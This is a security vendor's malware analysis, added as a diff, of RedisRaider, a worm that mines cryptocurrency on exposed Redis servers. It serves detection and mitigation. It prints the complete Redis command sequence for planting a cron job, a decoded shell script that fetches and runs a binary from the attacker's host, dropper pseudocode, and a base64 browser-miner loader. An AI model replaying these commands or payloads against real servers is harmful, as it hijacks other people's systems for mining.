@@ -1,0 +1,207 @@
+Key points and observations
+
+Datadog Security Research has discovered a new Linux cryptojacking campaign, named RedisRaider, targeting publicly accessible Redis servers.
+RedisRaider aggressively scans randomized portions of the IPv4 space and uses legitimate Redis configuration commands to execute malicious cron jobs on vulnerable systems.
+RedisRaider’s Go-based primary payload is heavily obfuscated and embeds a packed version of an XMRig miner, which it unpacks and deploys at runtime.
+In addition to server-side cryptojacking, RedisRaider’s infrastructure also hosted a web-based Monero miner, enabling a multi-pronged revenue generation strategy.
+The campaign incorporates subtle anti-forensics measures, such as short-key time-to-live (TTL) settings and database configuration changes, to minimize detection and hinder post-incident analysis.
+Overview
+Datadog Security Researchers recently discovered an emerging cryptojacking malware campaign targeting Redis on Linux. The threat actor behind this campaign deploys a sophisticated Linux worm that we’ve named RedisRaider. RedisRaider uses custom scanning logic to identify publicly accessible Redis servers across the internet, before exploiting them in an attempt to propagate a fork of the XMRig miner.
+RedisRaider also employs a number of obfuscation techniques to hinder analysis. We assess with high confidence that the threat actor behind the campaign is experienced in malware development and possesses some knowledge of Redis, Go, and Linux internals. Various methods of obfuscation are present within the binary, including the use of Garble, a compile-time obfuscator for Go popularized by the open source adversary emulation framework Sliver.
+RedisRaider uses command-and-control (C2) infrastructure to host its primary payload. Our analysis of this infrastructure revealed an additional cryptojacking campaign, this time involving an in-browser cryptocurrency miner hosted on a South Korean web server. This strongly suggests that the threat actor is conducting multiple coordinated cryptojacking campaigns across numerous domains.
+Initial access
+RedisRaider identifies vulnerable hosts by scanning portions of the internet for Redis servers exposed on the default port, 6379. The scanning algorithm generates a list of Class A IP addresses to scan, starting at 1.x.x.x and incrementing the first octet by one. The remaining octets of the IP address are randomized, resulting in indiscriminate scanning across the entire IPv4 address space.
+Example IP addresses observed during dynamic analysis include:
+98[.]163.10.160
+
+172[.]111.44.53
+
+23[.]240.31.221
+
+107[.]133.227.237
+
+188[.]179.249.44
+Upon identifying a potential target, the malware issues the INFO command and parses the response to determine if the Redis instance is running on a Linux host. If so, it proceeds with exploitation by abusing Redis’s SET command to inject a cron job. If a non-Linux system is encountered, the malware writes not linux, skip to standard out and resumes the scanning loop.
+The exploit involves writing a base64-encoded shell script to a Redis key (t), formatted as a cron entry:
+set t "*/1 * * * * root sh -c 'echo dT0iaHR0cDovL2EuaGJ3ZWIuaWN1OjgwODAvdXBsb2Fkcy8yMDI0LTcvOTk2MzYtNWIwYy00OTk5LWIucG5nIgp0PSIvdG1wIgpmPSJteXNxbCIKaWYgISBbIC1mICIkdC8kZiIgXTsgdGhlbgogIGlmIHdoaWNoIGN1cmw7IHRoZW4KICAgIGN1cmwgJHUgLW8gJHQvJGYgPiAvZGV2L251bGwgMj4mMQogIGZpCiAgaWYgISBbIC1mICIkdC8kZiIgXSAmJiB3aGljaCB3Z2V0OyB0aGVuCiAgICAgIHdnZXQgJHUgLU8gJHQvJGYgPiAvZGV2L251bGwgMj4mMQogIGZpCmZpCmNobW9kICt4ICR0LyRmClBBVEg9JHQ6JFBBVEggbm9odXAgJGYgPiAvZGV2L251bGwgMj4mMSAm | base64 -d | sh'" ex 120
+
+set t creates the malicious key containing the cron syntax.
+The ex 120 argument defines a 120-second TTL, ensuring the key expires quickly—a subtle anti-forensics technique unique to this campaign.
+To actually execute this as a cron job, the malware uses Redis’s CONFIG command in an attempt to change the working directory of the Redis server to /etc/cron.d using the following command:
+
+config set dir "/etc/cron.d"
+If this succeeds, the following commands are used to write the database to disk, in the hope that the cron scheduler will read the dumped file and interpret it as a legitimate job:
+
+config set dbfilename "apache"
+bgsave
+This results in the file /etc/cron.d/apache being written to disk, where it will be periodically read by the cron scheduler. These steps form a common Redis exploitation pattern, which can be mitigated by running Redis in protected mode, effectively disabling the CONFIG command.
+The malware also runs the following configuration commands:
+
+config set stop-writes-on-bgsave-error no: Allows the threat actor to continue exploiting the Redis server, even if the bgsave command fails.
+config set rdbcompression no: Prevents the dumped database from being compressed. This ensures that the Cron syntax within the t key is preserved.
+del t: An anti-forensics measure used to remove evidence of exploitation within the database.
+A list of all Redis commands executed by the malware can be found in the [Annex](#annex) section.
+For Redis servers with authentication enabled, the malware will attempt to authenticate using hardcoded credential pairs.
+Execution
+With the dumped database file in a valid cron directory, the base64-encoded shell script within the initial access payload is decoded and executed:
+u="http://a.hbweb[.]icu:8080/uploads/2024-7/99636-5b0c-4999-b.png"
+t="/tmp"
+f="mysql"
+
+if ! [ -f "$t/$f" ]; then
+  if which curl; then
+    curl $u -o $t/$f > /dev/null 2>&1
+  fi
+  if ! [ -f "$t/$f" ] && which wget; then
+    wget $u -O $t/$f > /dev/null 2>&1
+  fi
+fi
+
+chmod +x $t/$f
+PATH=$t:$PATH nohup $f > /dev/null 2>&1
+This shell script:
+
+Downloads the RedisRaider binary to /tmp/mysql using either curl or wget
+Makes it executable
+Executes it in the background using nohup
+Actions on objective
+RedisRaider’s main payload is an x86-64 ELF binary, written to the path /tmp/mysql as outlined above. The payload serves as a dropper for a custom build of XMRig and is responsible for propagating the malware to deliver the miner. Upon execution, this payload queries the hardware specification of the target system in a manner consistent with other cryptojacking families.
+Generally, this involves:
+
+Checking the number of CPU cores
+Querying the huge page size
+Getting or setting resource limits
+openat(AT_FDCWD, "/sys/kernel/mm/transparent_hugepage/hpage_pmd_size", O_RDONLY) = 3
+getrlimit(RLIMIT_NOFILE, {rlim_cur=1024, rlim_max=1024*1024}) = 0
+setrlimit(RLIMIT_NOFILE, {rlim_cur=1024*1024, rlim_max=1024*1024}) = 0
+Snippets from strace demonstrating RedisRaider pre-mining activities.
+Once launched, the malware first contacts httpbin[.]org to test network connectivity, before beginning to scan for additional Redis targets, continuing the propagation cycle. If a valid target is identified, RedisRaider prints a log statement to standard out and begins the initial access procedure described previously.
+new target: 47[.]28.172.85:6379, with passwod:
+new target: 25[.]104.69.240:6379, with passwod:
+new target: 1[.]206.244.7:6379, with passwod:
+new target: 247[.]140.250.200:6379, with passwod:
+Example standard out logging from RedisRaider’s scanning routine (note misspelling of “password”).
+The malware uses multiple concurrent Goroutines (lightweight threads) to conduct scanning and exploitation. Once the scanning loop is initiated, the malware spawns another thread to drop and execute the miner. The primary payload bundles a packed version of the miner (more on this in the Defense Evasion section) within a non-executable section of the binary. The Goroutine responsible for dropping the miner unpacks it during runtime and writes it to disk at the path /tmp/mysql, effectively overwriting the original dropper binary.
+From there, the malware executes the miner using nohup, preventing it from terminating when the parent dies and running it in the background for increased stealth.
+minerWriteTarget = writeBuffer;
+
+  // Decrypt and prepare the miner binary in memory
+  decodedBlob = extractAndDecodeMiner(a1, a2, notUsed, temp);
+
+  decodedLength = payloadSize;
+
+  // Write the miner to disk: /tmp/mysql with 0755 (0x1ED)
+  result = os_WriteFile(minerWriteTarget, decodedLength, fd, decodedBlob, 0x1EDu);
+
+  if (!result)
+  {
+    // Construct command to execute the miner using nohup
+    nohupString = sub_9A64C0(); 
+    argv[1] = 2;
+    argv[0] = "-c";
+    argv[3] = minerWriteTarget; // path to /tmp/mysql
+    argv[2] = nohupString; // path again, for nohup execution
+    spawnArgs = sub_99DD20(2LL, 2LL, unused1, argv); // construct args
+
+    runtime_newobject();
+
+    execStruct = spawnArgs;
+    result = execCommand(2LL, 2LL); // launch process
+
+    if (result)
+    {
+      result[3](); // run the function (fork/exec)
+      runtime_convTstring(2LL, 2LL);
+      return fmt_Fprintln(1LL, 1LL); // log success
+    }
+  }
+Example dropper pseudocode from RedisRaider’s primary payload.
+Defense evasion
+The threat actor behind RedisRaider has invested significant time into obfuscating components of the binary in an attempt to hinder static analysis.
+Firstly, symbols within the binary have been obfuscated with Garble, effectively obscuring the functionality of the malware by hiding Go package names. Garble hooks various Go compiler functions to scramble symbols at the time of compilation. Since Go binaries are statically linked by default, a common workflow for analyzing them is to list symbols from embedded packages, allowing you to gain an understanding of the base functionality. However, Garble prevents this by replacing package names with a base64-encoded hash. Fortunately, some excellent deobfuscation tools exist.
+In addition to applying Garble obfuscation and stripping the binary of debugging symbols, the threat actor behind RedisRaider implemented a custom packing routine in an attempt to conceal the embedded miner payload.
+Before writing the miner payload to disk, RedisRaider extracts a packed version of the miner from a read-only section of its own binary and unpacks it in memory using a series of complex transformations.
+movzx   esi, byte ptr [rax+rdx]
+mov     rdi, rax
+mov     rax, 0F0F0F0F0F0F0F0F1h
+mov     r8, rdx
+imul    rdx
+lea     r9, [rdx+r8]
+sar     r9, 4
+mov     r10, r9
+shl     r9, 4
+add     r9, r10
+mov     rdx, r8
+sub     r8, r9
+xor     esi, r8d
+mov     [rdi+rdx], sil
+inc     rdx
+mov     rax, rdi
+Example transformations from RedisRaider’s unpacking routine
+Fortunately, since we were able to undo some of the Garble package obfuscation, this unpacking routine was easily bypassed in the debugger by setting a breakpoint on the subsequent call to os.WriteFile after the unpacking function returns. From there, we could dump the contents of rax and confirm that it was indeed the unpacked miner payload.
+A number of string obfuscation routines were also discovered in RedisRaider’s primary payload. One example used a 21-byte array to perform a byte-wise XOR across an encrypted string. When the string was decoded, the following characters were printable:
+start to
+However, the rest of decrypted data resulted in non-printable characters. It’s unclear whether this is the result of Go’s string handling, a poor implementation from the threat actor themselves or an anomaly in our disassembler, but we assess with medium confidence that this routine was intended to deobfuscate log statements from the malware during runtime.
+v34 = v4;
+v24 = 0;
+*v22 = 0x2872BD8B9AAA2B09LL;
+*&v22[5] = 0xE4A61A670E2872BDLL;
+v23 = 0x6C15E2A65D2EA19FLL;
+for ( i = 0LL; i < 21; ++i )
+{
+  v22[i] ^= XorKeyArray[i]; 
+}
+Pseudocode snippet demonstrating XOR-based string deobfuscation
+Infrastructure analysis and in-browser miner
+As of analyzing, the domain a.hbweb[.]icu was resolving to IP address 58.229.206[.]107. Since then the domain has been taken down but the host is still running. It runs several services such as MongoDB, MySQL, and Redis, as well as several HTTP servers.
+When connecting to a.hbweb[.]icu on port 8080, the following favicon was served:
+This seems to be a login page related to the Bico Global project hosted on GitHub, which is described as a blockchain system.
+While browsing to c[.]hbweb[.]icu domain, it was serving what looks like an empty page but was loading one Javascript file, which is still located at https://58.229.206[.]107/static/js/index.175a0ce4.js
+This Javascript file evaluates the following base64-encoded string:
+c2V0VGltZW91dCgoKT0+e3ZhciBlPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO2Uuc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvTmFqbUFqbWFsL21vbmVyby13ZWJtaW5lckBtYWluL3NjcmlwdC5qcyIsZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChlKSxzZXRUaW1lb3V0KCgpPT57dmFyIGU9d2luZG93O2Uuc2VydmVyPSJ3c3M6Ly9ueTEueG1ybWluaW5ncHJveHkuY29tIixlLnBvb2w9Im1vbmVyb29jZWFuLnN0cmVhbSIsZS53YWxsZXRBZGRyZXNzPSI0MW5UcXNYeHVNOGJQRU5FQkRmMVltSDl5S0JocGZzSmJnUUdFY1ZldFNzazJxQ0U1Sjk3eHRDQWlEYjdDUXZhOHU3aTk3MzVycmFncWVpVDJyTjlFa2I5MXNNWjkyRyIsZS53b3JrZXJJZD0iR0gtWE1SIixlLnRocmVhZHM9LTEsZS5wYXNzd29yZD0idiIsc3RhcnRNaW5pbmcocG9vbCx3YWxsZXRBZGRyZXNzLHdvcmtlcklkLHRocmVhZHMscGFzc3dvcmQpLGUudGhyb3R0bGVNaW5lcj0yMH0sM2UzKX0sM2UzKTs=
+Once decoded, this loads a Monero miner configured with moneroocean.stream pool and using this wallet:
+41nTqsXxuM8bPENEBDf1YmH9yKBhpfsJbgQGEcVetSsk2qCE5J97xtCAiDb7CQva8u7i9735rragqeiT2rN9Ekb91sMZ92G
+How Datadog can help
+Workload Protection leverages a real-time eBPF agent to detect various stages of post-exploitation activity, including:
+
+Network utility executed in container
+Redis modified cron job directory to execute commands
+Hash of known malware detected
+Conclusion
+RedisRaider represents a new benchmark in the evolution of Linux-targeted cryptojacking campaigns, combining aggressive worm-like propagation, deep system knowledge, and layered defense evasion techniques to maximize its reach. By exploiting unsecured Redis instances, deploying a custom XMRig miner, and using sophisticated obfuscation methods such as Garble, runtime unpacking, and anti-forensics tactics, the threat actor behind RedisRaider demonstrates both technical proficiency and operational maturity.
+The discovery of additional infrastructure hosting an in-browser Monero miner highlights a broader, multi-pronged monetization strategy that extends beyond traditional malware infections. Defenders must recognize that public-facing services like Redis are increasingly lucrative targets and should implement strong authentication, restricted access, and continuous monitoring to mitigate this threat. As RedisRaider shows, cryptojacking malware is no longer opportunistic—it is deliberate, well-engineered, and capable of achieving scale if left unchecked.
+Indicators of compromise
+
+Files	Context	SHA-256
+99636-5b0c-4999-b.png	x86-64 ELF primary payload	8d2efe92846cdf9c258f0f7e0a571a8d63c80f0fa321cb2c713fb528ed29ba42
+mysql (XMRig miner)	x86-64 ELF miner payload	7b2314bf8bf26ce3f3458b0d96921d259ee7b0be1c0b982c2a19d8c435b7e3ae
+Paths		
+/etc/cron.d/apache	Path to database dump file	
+URLs		
+http://a.hbweb[.]icu:8080/uploads/2024-7/99636-5b0c-4999-b.png	Payload delivery URL	
+IP Addresses		
+58[.]229.206[.]107	a[.]hbweb[.]icu IP resolution at time of writing	
+Complete list of Redis commands used by RedisRaider
+
+hello
+auth
+default 123456 (example default credentials)
+ping
+info
+config get dir
+config get dbfilename
+config get stop-writes-on-bgsave-error
+config set stop-writes-on-bgsave-error no
+config set dir /etc/cron.d
+config set dbfilename apache
+set t */1 * * * * root sh -c 'echo dT0iaHR0cDovL2EuaGJ3ZWIuaWN1OjgwODAvdXBsb2Fkcy8yMDI0LTcvOTk2MzYtNWIwYy00OTk5LWIucG5nIgp0PSIvdG1wIgpmPSJteXNxbCIKaWYgISBbIC1mICIkdC8kZiIgXTsgdGhlbgogIGlmIHdoaWNoIGN1cmw7IHRoZW4KICAgIGN1cmwgJHUgLW8gJHQvJGYgPiAvZGV2L251bGwgMj4mMQogIGZpCiAgaWYgISBbIC1mICIkdC8kZiIgXSAmJiB3aGljaCB3Z2V0OyB0aGVuCiAgICAgIHdnZXQgJHUgLU8gJHQvJGYgPiAvZGV2L251bGwgMj4mMQogIGZpCmZpCmNobW9kICt4ICR0LyRmClBBVEg9JHQ6JFBBVEggbm9odXAgJGYgPiAvZGV2L251bGwgMj4mMSAm|base64 -d|sh' ex 120
+config get slave-read-only
+config get rdbcompression
+config set rdbcompression no
+bgsave
+del t
+config set dir /tmp
+config set dbfilename dump.rdb
+config set rdbcompression yes
+config set slave-read-only yes
+config set stop-writes-on-bgsave-error yes
